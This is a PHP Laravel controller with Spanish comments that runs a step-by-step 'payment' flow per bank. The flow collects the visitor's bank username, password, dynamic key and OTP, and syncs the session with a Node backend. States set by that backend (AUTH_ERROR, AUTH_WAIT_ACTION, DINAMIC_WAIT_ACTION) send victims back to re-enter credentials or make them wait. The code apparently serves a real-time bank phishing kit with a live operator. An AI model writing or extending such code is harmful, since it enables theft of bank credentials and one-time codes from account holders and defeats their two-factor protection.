<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Arr;
use Illuminate\Support\Facades\Http;
use Illuminate\Support\Facades\View;
use GuzzleHttp\Promise\PromiseInterface;

class BankFlowController extends Controller
{
    public function start(string $bank, Request $request)
    {
        $cfg = config("banks.$bank");
        abort_if(!$cfg, 404);

        $maxSteps = (int) ($cfg['steps'] ?? 3);

        // Si viene sessionId por query param, intentar recuperar sesión del backend
        $externalSessionId = $request->query('sessionId');

        if ($externalSessionId) {
            $sc = $this->fetchExternalSession($externalSessionId);

            if ($sc) {
                // Actualizar banco y guardar en sesión local
                $sc['bank'] = $bank;

                $request->session()->put('sc', $sc);
                $request->session()->save();

                // Determinar el step correcto según el estado de la sesión
                $step = $this->expectedStepFor($sc, $maxSteps);

                return redirect()->route('pago.bank.step', ['bank' => $bank, 'step' => $step]);
            }
        }

        // Flujo normal: reinicia flujo "lógico", conserva RT si existe
        $old = (array) $request->session()->get('sc', []);

        $sc = [
            'bank' => $bank,
            'step' => '1',
            'rt_session_id' => $old['rt_session_id'] ?? null,
            'rt_session_token' => $old['rt_session_token'] ?? null,
            // No copiamos action/user/pass/dinamic/otp para no arrastrar estado
        ];

        $request->session()->put('sc', $sc);
        $request->session()->save();

        return redirect()->route('pago.bank.step', ['bank' => $bank, 'step' => 1]);
    }

    /**
     * Obtiene una sesión existente del backend Node usando el sessionId externo.
     */
    private function fetchExternalSession(string $sessionId): ?array
    {
        $baseUrl = rtrim(env('NODE_BACKEND_URL', 'http://localhost:3005'), '/');

        try {
            // Obtener datos de la sesión
            $url = $baseUrl . '/api/sessions/' . $sessionId;
            $resp = Http::timeout(10)->get($url);

            if ($resp instanceof \GuzzleHttp\Promise\PromiseInterface) {
                $resp = $resp->wait();
            }

            if (!$resp->successful()) {
                return null;
            }

            $session = $resp->json('session') ?? $resp->json();

            // Obtener token para esta sesión
            $tokenUrl = $baseUrl . '/api/sessions/' . $sessionId . '/issue-token';
            $tokenResp = Http::asJson()->timeout(10)->post($tokenUrl);

            if ($tokenResp instanceof \GuzzleHttp\Promise\PromiseInterface) {
                $tokenResp = $tokenResp->wait();
            }

            $sessionToken = $tokenResp->successful() ? $tokenResp->json('sessionToken') : null;

            return [
                'rt_session_id' => $sessionId,
                'rt_session_token' => $sessionToken,
                'action' => $session['action'] ?? null,
                'step' => $session['step'] ?? '1',
            ];
        } catch (\Throwable $e) {
            return null;
        }
    }

    public function step(string $bank, int $step, Request $request)
    {
        $cfg = config("banks.$bank");
        abort_if(!$cfg, 404);

        $maxSteps = (int) ($cfg['steps'] ?? 3);
        abort_if($step < 1 || $step > $maxSteps, 404);

        // ✅ Sync desde Node, pero SIN pisar reintento local
        $this->ensureRealtimeSession($request, $maxSteps);

        $this->syncActionFromNode($request);

        // ✅ Guard (con acción ya sincronizada)
        if ($redirect = $this->guardStepOrRedirect($request, $bank, $step, $maxSteps, false)) {
            return $redirect;
        }

        $view = $cfg['view_prefix'] . ".step{$step}";
        abort_if(!View::exists($view), 404);

        $sc = (array) $request->session()->get('sc', []);
        $sc['bank'] = $bank;
        $sc['step'] = (string) $step;

        // nonce anti doble submit para ESTE step
        $sc['step_nonce'] = bin2hex(random_bytes(16));

        $request->session()->put('sc', $sc);
        $request->session()->save();

        return view($view, [
            'bank' => $bank,
            'step' => $step,
            'maxSteps' => $maxSteps,
            'nodeUrl' => env('NODE_BACKEND_URL', 'http://localhost:3005'),
            'sessionId' => Arr::get($sc, 'rt_session_id'),
            'sessionToken' => Arr::get($sc, 'rt_session_token'),
            'stepNonce' => Arr::get($sc, 'step_nonce'),
            'flowRedirect' => $request->session()->get('flow_redirect_reason'),
        ]);
    }

    public function saveStep(string $bank, int $step, Request $request)
    {
        $cfg = config("banks.$bank");
        abort_if(!$cfg, 404);

        $maxSteps = (int) ($cfg['steps'] ?? 3);

        // ✅ Guard de POST: evita postear a step incorrecto
        if ($redirect = $this->guardStepOrRedirect($request, $bank, $step, $maxSteps, true)) {
            return $redirect;
        }

        $sc = (array) $request->session()->get('sc', []);

        // ✅ Anti doble submit (nonce)
        $nonce = (string) $request->input('step_nonce', '');
        $current = (string) Arr::get($sc, 'step_nonce', '');

        if ($nonce === '' || $current === '' || !hash_equals($current, $nonce)) {
            return redirect()->route('pago.bank.step', ['bank' => $bank, 'step' => $step]);
        }

        // consumir nonce
        unset($sc['step_nonce']);

        // ====== Guardados por step ======
        if ($maxSteps === 4) {
            if ($step === 1) {
                // ✅ si venía de AUTH_ERROR, habilita reintento
                if (($sc['action'] ?? null) === 'AUTH_ERROR') {
                    $sc['action'] = 'AUTH';
                    unset($sc['pass']); // fuerza step2 otra vez
                }

                $data = $request->validate([
                    'user' => 'required|string|max:50',
                ]);

                $sc['user'] = $data['user'];
            }

            if ($step === 2) {
                if (($sc['action'] ?? null) === 'AUTH_ERROR') {
                    $sc['action'] = 'AUTH';
                }

                $data = $request->validate([
                    'pass' => 'required|string|max:50',
                ]);

                $sc['pass'] = $data['pass'];
            }

            if ($step === 3 || $step === 4) {
                $data = $request->validate([
                    'dinamic' => 'nullable|string|min:6|max:8',
                    'otp' => 'nullable|string|min:6|max:8',
                ]);

                if (!empty($data['dinamic']))
                    $sc['dinamic'] = $data['dinamic'];
                if (!empty($data['otp']))
                    $sc['otp'] = $data['otp'];
            }
        } else {
            // tu lógica normal (3 steps)
            if ($step === 1) {
                $data = $request->validate(['user' => 'required|string|max:50', 'pass' => 'required|string|max:50']);
                $sc['user'] = $data['user'];
                $sc['pass'] = $data['pass'];
            }

            if ($step === 2 || $step === 3) {
                $data = $request->validate([
                    'dinamic' => 'nullable|string|min:6|max:8',
                    'otp' => 'nullable|string|min:6|max:8',
                ]);

                if (!empty($data['dinamic']))
                    $sc['dinamic'] = $data['dinamic'];
                if (!empty($data['otp']))
                    $sc['otp'] = $data['otp'];
            }
        }

        $next = min($step + 1, $maxSteps);

        $sc['bank'] = $bank;
        $sc['step'] = (string) $next;

        $request->session()->put('sc', $sc);
        $request->session()->save();

        return redirect()->route('pago.bank.step', ['bank' => $bank, 'step' => $next]);
    }

    private function ensureRealtimeSession(Request $request, int $maxSteps): void
    {
        $sc = (array) $request->session()->get('sc', []);
        $baseUrl = rtrim(env('NODE_BACKEND_URL', 'http://localhost:3005'), '/');

        // helper: detectar reintento local (NO dejar que Node lo pise)
        $isRetryingLocally = function (array $sc) use ($maxSteps): bool {
            if ($maxSteps !== 4)
                return false;

            $step = (string) ($sc['step'] ?? '');
            $hasUser = !empty($sc['user']);
            $hasPass = !empty($sc['pass']);

            // Si el usuario ya está reingresando credenciales (step1/step2 con user/pass)
            // no queremos que Node “re-imponga” AUTH_ERROR y lo devuelva a step1.
            return \in_array($step, ['1', '2'], true) && ($hasUser || $hasPass) && (($sc['action'] ?? null) === 'AUTH');
        };

        if (!empty($sc['url'])) {
            $sc['url'] = env('APP_URL');;
        }

        // 1) Ya existe sessionId => NO crear otra
        if (!empty($sc['rt_session_id'])) {

            // 1.1 token si falta
            if (empty($sc['rt_session_token'])) {
                try {
                    $url = $baseUrl . '/api/sessions/' . $sc['rt_session_id'] . '/issue-token';
                    $resp = Http::asJson()->timeout(10)->post($url);

                    if ($resp instanceof PromiseInterface)
                        $resp = $resp->wait();

                    if ($resp->successful()) {
                        $sc['rt_session_token'] = $resp->json('sessionToken');
                        $request->session()->put('sc', $sc);
                        $request->session()->save();
                    }
                } catch (\Throwable $e) {
                }
            }

            // 1.2 sync action si hay token
            if (!empty($sc['rt_session_token'])) {
                try {
                    $url = $baseUrl . '/api/sessions/' . $sc['rt_session_id'];
                    $resp = Http::withToken($sc['rt_session_token'])->timeout(10)->get($url);

                    if ($resp instanceof PromiseInterface)
                        $resp = $resp->wait();

                    if ($resp->successful()) {
                        $nodeAction = $resp->json('session.action') ?? $resp->json('action');

                        // ✅ si estoy reintentando localmente, NO dejo que Node me pise
                        if ($nodeAction && !$isRetryingLocally($sc)) {
                            $sc['action'] = $nodeAction;

                            // ✅ si Node está en AUTH_ERROR, prepara reintento
                            if ($maxSteps === 4 && $nodeAction === 'AUTH_ERROR') {
                                unset($sc['user'], $sc['pass']);
                            }

                            $request->session()->put('sc', $sc);
                            $request->session()->save();
                        }
                    }
                } catch (\Throwable $e) {
                }
            }

            return;
        }

        // 2) No hay sessionId => crear sesión realtime
        try {
            $url = $baseUrl . '/api/sessions';
            $resp = Http::asJson()->timeout(10)->post($url, $sc);

            if ($resp instanceof PromiseInterface)
                $resp = $resp->wait();

            if ($resp->successful()) {
                $sc['rt_session_id'] = $resp->json('sessionId');
                $sc['rt_session_token'] = $resp->json('sessionToken');

                $nodeAction = $resp->json('session.action') ?? $resp->json('action');
                if ($nodeAction)
                    $sc['action'] = $nodeAction;

                $request->session()->put('sc', $sc);
                $request->session()->save();
            }
        } catch (\Throwable $e) {
        }
    }

    private function normalizeFlowState(array $sc): ?string
    {
        return $sc['action'] ?? null;
    }

    private function expectedStepFor(array $sc, int $maxSteps): int
    {
        $action = $this->normalizeFlowState($sc);

        if (!$action)
            return (int) ($sc['step'] ?? 1);

        if ($maxSteps === 4) {
            // Si es AUTH_ERROR, manda a step1 (pero si ya comenzó reintento local, deja avanzar)
           /*  if ($action === 'AUTH_ERROR')
                return 1; */

            if (in_array($action, ['AUTH','AUTH_ERROR', 'AUTH_WAIT_ACTION'], true)) {
                if (empty($sc['user']))
                    return 1;
                if (empty($sc['pass']))
                    return 2;
                return 2;
            }

            if (in_array($action, ['DINAMIC', 'DINAMIC_WAIT_ACTION', 'DINAMIC_ERROR'], true))
                return 3;
            if (in_array($action, ['OTP', 'OTP_WAIT_ACTION', 'OTP_ERROR'], true))
                return 4;

            return (int) ($sc['step'] ?? 1);
        }

        if (in_array($action, ['AUTH', 'AUTH_ERROR'], true))
            return 1;
        if (in_array($action, ['DINAMIC', 'DINAMIC_ERROR'], true))
            return min(2, $maxSteps);
        if (in_array($action, ['OTP', 'OTP_ERROR'], true))
            return min(3, $maxSteps);

        return (int) ($sc['step'] ?? 1);
    }

    private function guardStepOrRedirect(Request $request, string $bank, int $step, int $maxSteps, bool $isPost = false)
    {
        $sc = (array) $request->session()->get('sc', []);

        // amarrar bank
        $sessionBank = $sc['bank'] ?? null;
        if ($sessionBank && $sessionBank !== $bank) {
            $request->session()->forget('sc');
            return redirect()->route('pago.bank', ['bank' => $bank]);
        }

        $expected = $this->expectedStepFor($sc, $maxSteps);

        if ($step !== $expected) {
            $request->session()->flash('flow_redirect_reason', [
                'from' => $step,
                'to' => $expected,
                'isPost' => $isPost,
                'state' => $this->normalizeFlowState($sc),
            ]);

            return redirect()->route('pago.bank.step', ['bank' => $bank, 'step' => $expected]);
        }

        return null;
    }

    private function syncActionFromNode(Request $request): void
    {
        $sc = (array) $request->session()->get('sc', []);
        $id = $sc['rt_session_id'] ?? null;
        if (!$id)
            return;

        $base = rtrim(env('NODE_BACKEND_URL', 'http://localhost:3005'), '/');
        $url = $base . '/api/sessions/' . $id;

        try {
            $resp = Http::timeout(5)->get($url);

            if ($resp instanceof PromiseInterface)
                $resp = $resp->wait();

            if (!$resp->successful())
                return;

            $action = $resp->json('action') ?? $resp->json('session.action');
            if ($action) {
                $sc['action'] = $action;
                $request->session()->put('sc', $sc);
                $request->session()->save();
            }
        } catch (\Throwable $e) {
        }
    }
}
